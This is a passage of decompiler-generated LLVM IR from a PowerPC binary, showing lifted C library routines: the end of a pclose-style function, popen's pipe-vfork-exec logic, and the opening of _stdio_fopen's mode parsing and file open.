dec_label_pc_10019c8c:                            ; preds = %dec_label_pc_10019ce0
  %v3_10019c8c = load i32, i32* %stack_var_-56, align 4
  br label %dec_label_pc_10019d0c

dec_label_pc_10019c94:                            ; preds = %dec_label_pc_10019c64, %dec_label_pc_10019ca4
  %v1_10019cb4 = phi i32 [ %v2_10019c98, %dec_label_pc_10019ca4 ], [ %v3_10019c58, %dec_label_pc_10019c64 ]
  %v1_10019c98 = inttoptr i32 %v1_10019cb4 to i32*
  %v2_10019c98 = load i32, i32* %v1_10019c98, align 4
  store i32 %v2_10019c98, i32* %r29.global-to-local, align 4
  %v3_10019c9c = icmp eq i32 %v2_10019c98, 0
  br i1 %v3_10019c9c, label %dec_label_pc_10019c7c, label %dec_label_pc_10019ca4

dec_label_pc_10019ca4:                            ; preds = %dec_label_pc_10019c94
  %v1_10019ca4 = add i32 %v2_10019c98, 4
  %v2_10019ca4 = inttoptr i32 %v1_10019ca4 to i32*
  %v3_10019ca4 = load i32, i32* %v2_10019ca4, align 4
  %v4_10019ca8 = icmp eq i32 %v3_10019ca4, %v1_10019c68
  br i1 %v4_10019ca8, label %dec_label_pc_10019cb0, label %dec_label_pc_10019c94

dec_label_pc_10019cb0:                            ; preds = %dec_label_pc_10019ca4
  %v1_10019cb0 = inttoptr i32 %v2_10019c98 to i32*
  %v2_10019cb0 = load i32, i32* %v1_10019cb0, align 4
  store i32 %v2_10019cb0, i32* %v1_10019c98, align 4
  br label %dec_label_pc_10019cb8

dec_label_pc_10019cb8:                            ; preds = %entry, %dec_label_pc_10019c7c, %dec_label_pc_10019c70, %dec_label_pc_10019cb0
  store i32 %v2_10019c40, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268541124, i32* @lr, align 4
  %v0_10019cc0 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10019cc4 = load i32, i32* %r29.global-to-local, align 4
  %v3_10019cc4 = icmp eq i32 %v0_10019cc4, 0
  br i1 %v3_10019cc4, label %dec_label_pc_10019d0c, label %dec_label_pc_10019ccc

dec_label_pc_10019ccc:                            ; preds = %dec_label_pc_10019cb8
  store i32 %v0_10019cc4, i32* @r3, align 4
  %v1_10019cd0 = add i32 %v0_10019cc4, 8
  %v2_10019cd0 = inttoptr i32 %v1_10019cd0 to i32*
  %v3_10019cd0 = load i32, i32* %v2_10019cd0, align 4
  store i32 %v3_10019cd0, i32* %r29.global-to-local, align 4
  store i32 268541144, i32* @lr, align 4
  %v0_10019cd4 = call i32 @free()
  %v0_10019cd8 = load i32, i32* @r31, align 4
  store i32 268541152, i32* @lr, align 4
  %v1_10019cdc = inttoptr i32 %v0_10019cd8 to i16*
  %v2_10019cdc = call i32 @__GI_fclose(i16* %v1_10019cdc)
  %v2_10019ce0 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_10019ce0

dec_label_pc_10019ce0:                            ; preds = %dec_label_pc_10019cf8, %dec_label_pc_10019ccc
  %v0_10019ce8 = load i32, i32* @r29, align 4
  store i32 268541168, i32* @lr, align 4
  %v3_10019cec = call i32 @waitpid(i32 %v0_10019ce8, i32 %v2_10019ce0, i32 0)
  %tmp8 = icmp sgt i32 %v3_10019cec, -1
  br i1 %tmp8, label %dec_label_pc_10019c8c, label %dec_label_pc_10019cf8

dec_label_pc_10019cf8:                            ; preds = %dec_label_pc_10019ce0
  %v0_10019cf8 = call i32 @__errno_location()
  %v1_10019cfc = inttoptr i32 %v0_10019cf8 to i32*
  %v2_10019cfc = load i32, i32* %v1_10019cfc, align 4
  %v3_10019d00 = icmp eq i32 %v2_10019cfc, 4
  br i1 %v3_10019d00, label %dec_label_pc_10019ce0, label %dec_label_pc_10019d0c

dec_label_pc_10019d0c:                            ; preds = %dec_label_pc_10019cf8, %dec_label_pc_10019cb8, %dec_label_pc_10019c8c
  %storemerge = phi i32 [ %v3_10019c8c, %dec_label_pc_10019c8c ], [ -1, %dec_label_pc_10019cb8 ], [ -1, %dec_label_pc_10019cf8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10019cc4, { 1, 0, 2 }
  uselistorder i32 %v2_10019c98, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_10019cb8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10019c94, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_10019d34 = load i8, i8* %arg2, align 1
  %v3_10019d3c = icmp eq i8 %v3_10019d34, 119
  br i1 %v3_10019d3c, label %dec_label_pc_10019d6c, label %dec_label_pc_10019d44

dec_label_pc_10019d44:                            ; preds = %entry
  %v3_10019d44 = icmp eq i8 %v3_10019d34, 114
  br i1 %v3_10019d44, label %dec_label_pc_10019d74, label %dec_label_pc_10019d54

dec_label_pc_10019d54:                            ; preds = %dec_label_pc_10019d44
  %v0_10019d54 = call i32 @__errno_location()
  %v2_10019d64 = inttoptr i32 %v0_10019d54 to i32*
  store i32 22, i32* %v2_10019d64, align 4
  br label %dec_label_pc_10019f34

dec_label_pc_10019d6c:                            ; preds = %entry
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10019d74

dec_label_pc_10019d74:                            ; preds = %dec_label_pc_10019d44, %dec_label_pc_10019d6c
  %v0_10019e3c = phi i32 [ 0, %dec_label_pc_10019d6c ], [ 1, %dec_label_pc_10019d44 ]
  store i32 12, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10019d7c.1142 to i32), i32* @lr, align 4
  %v0_10019d78 = call i32 @malloc()
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %v0_10019d78, i32* %r9.global-to-local, align 4
  %v3_10019d80 = icmp eq i32 %v0_10019d78, 0
  br i1 %v3_10019d80, label %dec_label_pc_10019f34, label %dec_label_pc_10019d90

dec_label_pc_10019d90:                            ; preds = %dec_label_pc_10019d74
  %v2_10019d90 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10019d90, i32* %r29.global-to-local, align 4
  store i32 268541340, i32* @lr, align 4
  %v2_10019d98 = call i32 @__GI_pipe(i32 %v2_10019d90, i32 %v0_10019d78)
  %v3_10019d9c = icmp eq i32 %v2_10019d98, 0
  br i1 %v3_10019d9c, label %dec_label_pc_10019da4, label %dec_label_pc_10019f24

dec_label_pc_10019da4:                            ; preds = %dec_label_pc_10019d90
  store i32 %v0_10019e3c, i32* %r9.global-to-local, align 4
  %v0_10019da8 = load i32, i32* @r31, align 4
  %tmp = sub nsw i32 0, %v0_10019e3c
  %v1_10019dac = and i32 %tmp, 4
  %v1_10019db0 = xor i32 %v1_10019dac, 4
  %v0_10019db4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10019db4 = add i32 %v0_10019db4, %v1_10019db0
  %v3_10019db4 = inttoptr i32 %v2_10019db4 to i32*
  %v4_10019db4 = load i32, i32* %v3_10019db4, align 4
  %v2_10019dc0 = add i32 %v0_10019db4, %v1_10019dac
  %v3_10019dc0 = inttoptr i32 %v2_10019dc0 to i32*
  %v4_10019dc0 = load i32, i32* %v3_10019dc0, align 4
  store i32 268541392, i32* @lr, align 4
  %v4_10019dcc = call i32 @fdopen(i32 %v4_10019db4, i32 %v0_10019da8, i32 %v0_10019e3c)
  %v3_10019dd0 = icmp eq i32 %v4_10019dcc, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10019dd0, label %dec_label_pc_10019ddc, label %dec_label_pc_10019df0

dec_label_pc_10019ddc:                            ; preds = %dec_label_pc_10019da4
  store i32 268541412, i32* @lr, align 4
  %v1_10019de0 = call i32 @__libc_close(i32 %v4_10019db4)
  store i32 ptrtoint (i32* @global_var_10019dec.1143 to i32), i32* @lr, align 4
  %v1_10019de8 = call i32 @__libc_close(i32 %v4_10019dc0)
  br label %dec_label_pc_10019f24

dec_label_pc_10019df0:                            ; preds = %dec_label_pc_10019da4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32), i32* %r29.global-to-local, align 4
  %v2_10019e04 = ptrtoint i32* %stack_var_-64 to i32
  %v4_10019e08 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-64, i32 268527832, i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32))
  store i32 ptrtoint (i32* @global_var_10019e14.1145 to i32), i32* @lr, align 4
  %v1_10019e10 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32))
  store i32 %v1_10019e10, i32* @r3, align 4
  store i32 268541464, i32* @lr, align 4
  %v1_10019e14 = call i32 @__vfork(i32 %v1_10019e10)
  %v3_10019e18 = icmp eq i32 %v1_10019e14, 0
  %v0_10019e1c = call i32 @__asm_mfcr()
  store i32 %v0_10019e1c, i32* %r29.global-to-local, align 4
  br i1 %v3_10019e18, label %dec_label_pc_10019e24, label %dec_label_pc_10019ea4

dec_label_pc_10019e24:                            ; preds = %dec_label_pc_10019df0
  store i32 268541484, i32* @lr, align 4
  %v1_10019e28 = call i32 @__libc_close(i32 %v4_10019db4)
  store i32 %v0_10019e3c, i32* %r9.global-to-local, align 4
  %v4_10019e34 = icmp eq i32 %v4_10019dc0, %v0_10019e3c
  br i1 %v4_10019e34, label %dec_label_pc_10019e50, label %dec_label_pc_10019e3c

dec_label_pc_10019e3c:                            ; preds = %dec_label_pc_10019e24
  store i32 268541512, i32* @lr, align 4
  %v2_10019e44 = call i32 @dup2(i32 %v4_10019dc0, i32 %v0_10019e3c)
  store i32 268541520, i32* @lr, align 4
  %v1_10019e4c = call i32 @__libc_close(i32 %v4_10019dc0)
  br label %dec_label_pc_10019e50

dec_label_pc_10019e50:                            ; preds = %dec_label_pc_10019e24, %dec_label_pc_10019e3c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %storemerge1 = load i32, i32* @global_var_10045214.1139, align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_10019e6c4 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10019e6c4, label %dec_label_pc_10019e74, label %dec_label_pc_10019e5c

dec_label_pc_10019e5c:                            ; preds = %dec_label_pc_10019e50, %dec_label_pc_10019e5c
  %v0_10019e5c = phi i32 [ %storemerge, %dec_label_pc_10019e5c ], [ %storemerge1, %dec_label_pc_10019e50 ]
  %v1_10019e5c = add i32 %v0_10019e5c, 4
  %v2_10019e5c = inttoptr i32 %v1_10019e5c to i32*
  %v3_10019e5c = load i32, i32* %v2_10019e5c, align 4
  store i32 %v3_10019e5c, i32* %r9.global-to-local, align 4
  %v1_10019e60 = add i32 %v3_10019e5c, 4
  %v2_10019e60 = inttoptr i32 %v1_10019e60 to i32*
  %v3_10019e60 = load i32, i32* %v2_10019e60, align 4
  store i32 268541544, i32* @lr, align 4
  %v1_10019e64 = call i32 @__libc_close(i32 %v3_10019e60)
  %v0_10019e68 = load i32, i32* %r29.global-to-local, align 4
  %v1_10019e68 = inttoptr i32 %v0_10019e68 to i32*
  %storemerge = load i32, i32* %v1_10019e68, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10019e6c = icmp eq i32 %storemerge, 0
  br i1 %v3_10019e6c, label %dec_label_pc_10019e74, label %dec_label_pc_10019e5c

dec_label_pc_10019e74:                            ; preds = %dec_label_pc_10019e5c, %dec_label_pc_10019e50
  %v8_10019e98 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1002e3cc.1146 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002e3d4.1147 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002e3d8.1148 to i32), i32 %arg1, i32 0)
  %v1_10019ea0 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_10019ea4

dec_label_pc_10019ea4:                            ; preds = %dec_label_pc_10019df0, %dec_label_pc_10019e74
  store i32 1, i32* @r4, align 4
  store i32 %v2_10019e04, i32* @r3, align 4
  store i32 268541620, i32* @lr, align 4
  %v0_10019eb0 = call i32 @__pthread_cleanup_pop_restore()
  store i32 268541628, i32* @lr, align 4
  %v1_10019eb8 = call i32 @__libc_close(i32 %v4_10019dc0)
  %v0_10019ebc = load i32, i32* %r29.global-to-local, align 4
  %v1_10019ebc = call %0 @__asm_mtcrf(i32 128, i32 %v0_10019ebc)
  %v2_10019ebc = extractvalue %0 %v1_10019ebc, 0
  %v4_10019ebc = extractvalue %0 %v1_10019ebc, 2
  %v2_10019ec0 = or i1 %v4_10019ebc, %v2_10019ebc
  br i1 %v2_10019ec0, label %dec_label_pc_10019f1c, label %dec_label_pc_10019ec4

dec_label_pc_10019ec4:                            ; preds = %dec_label_pc_10019ea4
  store i32 %v0_10019d78, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32), i32* %r29.global-to-local, align 4
  %v0_10019ed8 = load i32, i32* @r31, align 4
  %v2_10019ed8 = add i32 %v0_10019d78, 8
  %v3_10019ed8 = inttoptr i32 %v2_10019ed8 to i32*
  store i32 %v0_10019ed8, i32* %v3_10019ed8, align 4
  store i32 %v4_10019dcc, i32* %r11.global-to-local, align 4
  %v1_10019ee0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10019ee0 = add i32 %v1_10019ee0, 4
  %v3_10019ee0 = inttoptr i32 %v2_10019ee0 to i32*
  store i32 %v4_10019dcc, i32* %v3_10019ee0, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v4_10019eec = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-64, i32 268527832, i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32))
  %v0_10019ef0 = load i32, i32* %r29.global-to-local, align 4
  store i32 268541688, i32* @lr, align 4
  %v1_10019ef4 = call i32 @pthread_mutex_lock(i32 %v0_10019ef0)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10019efc = load i32, i32* @global_var_10045214.1139, align 4
  store i32 %v2_10019e04, i32* @r3, align 4
  store i32 %v0_10019d78, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  %v2_10019f0c = inttoptr i32 %v0_10019d78 to i32*
  store i32 %v3_10019efc, i32* %v2_10019f0c, align 4
  %v0_10019f10 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10019f10, i32* @global_var_10045214.1139, align 4
  store i32 ptrtoint (i32* @global_var_10019f18.1150 to i32), i32* @lr, align 4
  %v0_10019f14 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10019f34

dec_label_pc_10019f1c:                            ; preds = %dec_label_pc_10019ea4
  store i32 268541732, i32* @lr, align 4
  %v1_10019f20 = inttoptr i32 %v4_10019dcc to i16*
  %v2_10019f20 = call i32 @__GI_fclose(i16* %v1_10019f20)
  br label %dec_label_pc_10019f24

dec_label_pc_10019f24:                            ; preds = %dec_label_pc_10019d90, %dec_label_pc_10019ddc, %dec_label_pc_10019f1c
  store i32 %v0_10019d78, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10019f2c.1151 to i32), i32* @lr, align 4
  %v0_10019f28 = call i32 @free()
  br label %dec_label_pc_10019f34

dec_label_pc_10019f34:                            ; preds = %dec_label_pc_10019d74, %dec_label_pc_10019ec4, %dec_label_pc_10019d54, %dec_label_pc_10019f24
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10019d74 ], [ 0, %dec_label_pc_10019f24 ], [ %v4_10019dcc, %dec_label_pc_10019ec4 ], [ 0, %dec_label_pc_10019d54 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v4_10019dcc, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_10019dc0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_10019d78, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder i32 %v0_10019e3c, { 1, 3, 2, 5, 0, 4 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 3, 2, 8, 9, 4, 5, 6, 7 }
  uselistorder i32* @global_var_10045214.1139, { 1, 2, 0, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32), { 2, 5, 0, 4, 6, 1, 3, 7 }
  uselistorder i32 (i32, i32)* @__GI_pipe, { 1, 0 }
  uselistorder label %dec_label_pc_10019f34, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10019f24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10019ea4, { 1, 0 }
  uselistorder label %dec_label_pc_10019e5c, { 1, 0 }
  uselistorder label %dec_label_pc_10019e50, { 1, 0 }
  uselistorder label %dec_label_pc_10019d74, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10019f50 = load i32, i32* @lr, align 4
  store i32 %v0_10019f50, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10019f60 = load i32, i32* @r5, align 4
  store i32 %v0_10019f60, i32* @r31, align 4
  %v0_10019f64 = load i32, i32* @r6, align 4
  store i32 %v0_10019f64, i32* @r29, align 4
  %v3_10019f68 = load i8, i8* %arg2, align 1
  %v4_10019f68 = zext i8 %v3_10019f68 to i32
  store i32 %v4_10019f68, i32* %r0.global-to-local, align 4
  %v3_10019f6c = icmp eq i8 %v3_10019f68, 114
  br i1 %v3_10019f6c, label %dec_label_pc_10019fb8, label %dec_label_pc_10019f74

dec_label_pc_10019f74:                            ; preds = %entry
  %v3_10019f74 = icmp eq i8 %v3_10019f68, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10019f74, label %dec_label_pc_10019fbc, label %dec_label_pc_10019f80

dec_label_pc_10019f80:                            ; preds = %dec_label_pc_10019f74
  %v3_10019f80 = icmp eq i8 %v3_10019f68, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10019f80, label %dec_label_pc_10019fbc, label %dec_label_pc_10019f8c

dec_label_pc_10019f8c:                            ; preds = %dec_label_pc_1001a04c, %dec_label_pc_1001a01c, %dec_label_pc_10019f80
  %v0_10019f8c = call i32 @__errno_location()
  store i32 22, i32* %r0.global-to-local, align 4
  %v0_10019f94 = load i32, i32* @r31, align 4
  %v3_10019f94 = icmp eq i32 %v0_10019f94, 0
  %v2_10019f98 = inttoptr i32 %v0_10019f8c to i32*
  store i32 22, i32* %v2_10019f98, align 4
  br i1 %v3_10019f94, label %dec_label_pc_1001a1f0, label %dec_label_pc_10019fa0

dec_label_pc_10019fa0:                            ; preds = %dec_label_pc_1001a080, %dec_label_pc_10019f8c
  %v0_10019fa0 = load i32, i32* @r31, align 4
  %v1_10019fa0 = inttoptr i32 %v0_10019fa0 to i16*
  %v2_10019fa0 = load i16, i16* %v1_10019fa0, align 2
  %v3_10019fa0 = zext i16 %v2_10019fa0 to i32
  store i32 %v3_10019fa0, i32* %r0.global-to-local, align 4
  %v1_10019fa4 = and i32 %v3_10019fa0, 8192
  store i32 %v1_10019fa4, i32* %r9.global-to-local, align 4
  %v3_10019fa4 = icmp eq i32 %v1_10019fa4, 0
  br i1 %v3_10019fa4, label %dec_label_pc_1001a1f0, label %dec_label_pc_10019fac

dec_label_pc_10019fac:                            ; preds = %dec_label_pc_10019fa0
  store i32 %v0_10019fa0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10019fb4.1153 to i32), i32* @lr, align 4
  %v0_10019fb0 = call i32 @free()
  br label %dec_label_pc_1001a1f0

dec_label_pc_10019fb8:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10019fbc

dec_label_pc_10019fbc:                            ; preds = %dec_label_pc_10019f80, %dec_label_pc_10019f74, %dec_label_pc_10019fb8
  %v0_10019fdc = phi i32 [ 1089, %dec_label_pc_10019f80 ], [ 577, %dec_label_pc_10019f74 ], [ 1, %dec_label_pc_10019fb8 ]
  %v2_10019fbc = add i32 %tmp, 1
  %v3_10019fbc = inttoptr i32 %v2_10019fbc to i8*
  %v4_10019fbc = load i8, i8* %v3_10019fbc, align 1
  %v5_10019fbc = zext i8 %v4_10019fbc to i32
  store i32 %v5_10019fbc, i32* %r0.global-to-local, align 4
  %v3_10019fc4 = icmp eq i8 %v4_10019fbc, 98
  br i1 %v3_10019fc4, label %dec_label_pc_10019fd0, label %dec_label_pc_10019fcc

dec_label_pc_10019fcc:                            ; preds = %dec_label_pc_10019fbc
  br label %dec_label_pc_10019fd0

dec_label_pc_10019fd0:                            ; preds = %dec_label_pc_10019fbc, %dec_label_pc_10019fcc
  %storemerge = phi i32 [ %tmp, %dec_label_pc_10019fcc ], [ %v2_10019fbc, %dec_label_pc_10019fbc ]
  %v0_10019fd0 = phi i32 [ %tmp, %dec_label_pc_10019fcc ], [ %v2_10019fbc, %dec_label_pc_10019fbc ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10019fd0 = add i32 %v0_10019fd0, 1
  %v2_10019fd0 = inttoptr i32 %v1_10019fd0 to i8*
  %v3_10019fd0 = load i8, i8* %v2_10019fd0, align 1
  %v4_10019fd0 = zext i8 %v3_10019fd0 to i32
  store i32 %v4_10019fd0, i32* %r0.global-to-local, align 4
  %v3_10019fd4 = icmp eq i8 %v3_10019fd0, 43
  br i1 %v3_10019fd4, label %dec_label_pc_10019fdc, label %dec_label_pc_10019fe4

dec_label_pc_10019fdc:                            ; preds = %dec_label_pc_10019fd0
  store i32 %v0_10019fdc, i32* %r9.global-to-local, align 4
  %v1_10019fe0 = add nuw nsw i32 %v0_10019fdc, 1
  store i32 %v1_10019fe0, i32* @r28, align 4
  br label %dec_label_pc_10019fe4

dec_label_pc_10019fe4:                            ; preds = %dec_label_pc_10019fd0, %dec_label_pc_10019fdc
  %v3_10019fe4 = icmp eq i32 %v0_10019f60, 0
  br i1 %v3_10019fe4, label %dec_label_pc_10019fec, label %dec_label_pc_1001a014

dec_label_pc_10019fec:                            ; preds = %dec_label_pc_10019fe4
  store i32 80, i32* @r3, align 4
  store i32 268541940, i32* @lr, align 4
  %v0_10019ff0 = call i32 @malloc()
  store i32 %v0_10019ff0, i32* @r31, align 4
  %v4_10019ff4 = icmp eq i32 %v0_10019ff0, 0
  br i1 %v4_10019ff4, label %dec_label_pc_1001a1f4, label %dec_label_pc_10019ffc

dec_label_pc_10019ffc:                            ; preds = %dec_label_pc_10019fec
  %v1_1001a000 = add i32 %v0_10019ff0, 56
  store i32 %v1_1001a000, i32* @r3, align 4
  %v3_1001a004 = inttoptr i32 %v0_10019ff0 to i16*
  store i16 8192, i16* %v3_1001a004, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001a00c = load i32, i32* @r31, align 4
  %v2_1001a00c = add i32 %v1_1001a00c, 8
  %v3_1001a00c = inttoptr i32 %v2_1001a00c to i32*
  store i32 0, i32* %v3_1001a00c, align 4
  store i32 268541972, i32* @lr, align 4
  %v0_1001a010 = call i32 @__stdio_init_mutex()
  %v0_1001a014.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001a014

dec_label_pc_1001a014:                            ; preds = %dec_label_pc_10019fe4, %dec_label_pc_10019ffc
  %v0_1001a074 = phi i32 [ %v0_10019f64, %dec_label_pc_10019fe4 ], [ %v0_1001a014.pre, %dec_label_pc_10019ffc ]
  %v1_1001a014 = icmp slt i32 %v0_1001a074, 0
  br i1 %v1_1001a014, label %dec_label_pc_1001a074, label %dec_label_pc_1001a01c

dec_label_pc_1001a01c:                            ; preds = %dec_label_pc_1001a014
  %v1_1001a020 = add i32 %arg1, 1
  store i32 %v1_1001a020, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_1001a028 = load i32, i32* @r31, align 4
  %v2_1001a028 = add i32 %v1_1001a028, 4
  %v3_1001a028 = inttoptr i32 %v2_1001a028 to i32*
  store i32 %v0_1001a074, i32* %v3_1001a028, align 4
  %v0_1001a02c = load i32, i32* @r28, align 4
  %v1_1001a02c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001a02c = and i32 %v1_1001a02c, %v0_1001a02c
  %v1_1001a030 = add i32 %v2_1001a02c, 1
  store i32 %v1_1001a030, i32* %r9.global-to-local, align 4
  %v1_1001a034 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001a034 = and i32 %v1_1001a034, %v1_1001a030
  store i32 %v2_1001a034, i32* %r0.global-to-local, align 4
  %v4_1001a038 = icmp eq i32 %v2_1001a034, %v1_1001a030
  br i1 %v4_1001a038, label %dec_label_pc_1001a040, label %dec_label_pc_10019f8c

dec_label_pc_1001a040:                            ; preds = %dec_label_pc_1001a01c
  %v2_1001a040 = sub i32 -1, %arg1
  %v3_1001a040 = and i32 %v0_1001a02c, %v2_1001a040
  store i32 %v3_1001a040, i32* %r0.global-to-local, align 4
  %v1_1001a044 = and i32 %v3_1001a040, 1024
  store i32 %v1_1001a044, i32* %r9.global-to-local, align 4
  %v3_1001a044 = icmp eq i32 %v1_1001a044, 0
  br i1 %v3_1001a044, label %dec_label_pc_1001a068, label %dec_label_pc_1001a04c

dec_label_pc_1001a04c:                            ; preds = %dec_label_pc_1001a040
  %v0_1001a04c = load i32, i32* @r29, align 4
  store i32 268542048, i32* @lr, align 4
  %v2_1001a05c = call i32 @__libc_fcntl(i32 %v0_1001a04c, i32 4)
  %v3_1001a060 = icmp eq i32 %v2_1001a05c, 0
  br i1 %v3_1001a060, label %dec_label_pc_1001a068, label %dec_label_pc_10019f8c

dec_label_pc_1001a068:                            ; preds = %dec_label_pc_1001a04c, %dec_label_pc_1001a040
  %v1_1001a068 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_1001a068, i32* %r0.global-to-local, align 4
  %v0_1001a06c = load i32, i32* @r28, align 4
  %v2_1001a06c = or i32 %v0_1001a06c, %v1_1001a068
  store i32 %v2_1001a06c, i32* @r28, align 4
  br label %dec_label_pc_1001a0a0

dec_label_pc_1001a074:                            ; preds = %dec_label_pc_1001a014
  %v3_1001a074 = icmp eq i32 %v0_1001a074, -1
  %v0_1001a084.pre = load i32, i32* @r28, align 4
  br i1 %v3_1001a074, label %dec_label_pc_1001a080, label %dec_label_pc_1001a07c

dec_label_pc_1001a07c:                            ; preds = %dec_label_pc_1001a074
  %v1_1001a07c = or i32 %v0_1001a084.pre, 65536
  store i32 %v1_1001a07c, i32* @r28, align 4
  br label %dec_label_pc_1001a080

dec_label_pc_1001a080:                            ; preds = %dec_label_pc_1001a074, %dec_label_pc_1001a07c
  %v0_1001a084 = phi i32 [ %v1_1001a07c, %dec_label_pc_1001a07c ], [ %v0_1001a084.pre, %dec_label_pc_1001a074 ]
  store i32 %v0_1001a084, i32* @r4, align 4
  store i32 438, i32* @r5, align 4
  store i32 268542100, i32* @lr, align 4
  %v0_1001a090 = call i32 @__libc_open()
  %v1_1001a094 = icmp slt i32 %v0_1001a090, 0
  %v1_1001a098 = load i32, i32* @r31, align 4
  %v2_1001a098 = add i32 %v1_1001a098, 4
  %v3_1001a098 = inttoptr i32 %v2_1001a098 to i32*
  store i32 %v0_1001a090, i32* %v3_1001a098, align 4
  br i1 %v1_1001a094, label %dec_label_pc_10019fa0, label %dec_label_pc_1001a080.dec_label_pc_1001a0a0_crit_edge

dec_label_pc_1001a080.dec_label_pc_1001a0a0_crit_edge: ; preds = %dec_label_pc_1001a080
  %v0_1001a0a4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001a0a0

dec_label_pc_1001a0a0:                            ; preds = %dec_label_pc_1001a080.dec_label_pc_1001a0a0_crit_edge, %dec_label_pc_1001a068
  %v0_1001a0a4 = phi i32 [ %v0_1001a0a4.pre, %dec_label_pc_1001a080.dec_label_pc_1001a0a0_crit_edge ], [ %v2_1001a06c, %dec_label_pc_1001a068 ]
  %v0_1001a0a0 = load i32, i32* @r31, align 4
  %v1_1001a0a0 = inttoptr i32 %v0_1001a0a0 to i16*
  %v2_1001a0a0 = load i16, i16* %v1_1001a0a0, align 2
  %v3_1001a0a0 = zext i16 %v2_1001a0a0 to i32
  store i32 %v3_1001a0a0, i32* %r0.global-to-local, align 4
  %v1_1001a0a4 = urem i32 %v0_1001a0a4, 4
  store i32 %v1_1001a0a4, i32* %r29.global-to-local, align 4
  %v1_1001a0a8 = call i32 @__asm_rlwinm(i32 %v0_1001a0a4, i32 0, i32 21, i32 21)
  %v1_1001a0ac = add nuw nsw i32 %v1_1001a0a4, 1
  %v1_1001a0b0 = xor i32 %v1_1001a0ac, 3
  store i32 %v1_1001a0b0, i32* %r29.global-to-local, align 4
  %v1_1001a0b4 = call i32 @__asm_rlwinm(i32 %v3_1001a0a0, i32 0, i32 18, i32 18)
  %v2_1001a0b4 = trunc i32 %v1_1001a0b4 to i16
  store i32 %v1_1001a0b4, i32* %r0.global-to-local, align 4
  %v1_1001a0b8 = mul nuw nsw i32 %v1_1001a0b0, 16
  store i32 %v1_1001a0b8, i32* %r29.global-to-local, align 4
  %v3_1001a0bc = load i32, i32* @r31, align 4
